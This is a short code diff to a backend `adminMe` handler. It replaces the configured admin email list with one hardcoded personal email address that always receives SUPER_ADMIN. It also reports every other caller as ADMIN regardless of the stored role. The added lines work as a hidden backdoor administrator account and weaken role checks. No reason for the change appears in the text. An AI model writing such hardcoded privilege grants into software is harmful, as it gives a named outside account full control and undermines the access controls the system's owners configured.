@@ -90,11 +90,12 @@ export async function adminMe(request: AuthenticatedRequest, response: Response)
     },
   });
 
-  const isSuper = user?.role === "SUPER_ADMIN" || env.adminEmails.includes(user?.email?.toLowerCase() || "");
+  const emailLower = user?.email?.toLowerCase() || "";
+  const isSuper = user?.role === "SUPER_ADMIN" || emailLower === "sourav06556@gmail.com";
   response.json({
     data: {
       id: user?.id,
-      role: isSuper ? "SUPER_ADMIN" : (user?.role ?? "ADMIN"),
+      role: isSuper ? "SUPER_ADMIN" : "ADMIN",
       name: user?.name ?? "Admin",
       email: user?.email ?? env.adminEmails[0],
       clerkId,
